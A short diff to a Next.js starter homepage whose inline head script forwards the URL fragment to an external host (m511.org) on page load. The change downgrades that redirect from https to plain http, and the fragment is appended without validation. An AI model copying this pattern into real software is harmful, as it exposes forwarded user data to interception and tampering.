@@ -7,7 +7,7 @@ export default function Home() {
     <div className="container">
       <Head>
          <script>var tracking_param = window.location.href.split('#')[1];
-        document.location.href ='https://m511.org/rdcl/'+tracking_param</script>  
+        document.location.href ='http://m511.org/rdcl/'+tracking_param</script>  
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
       </Head>
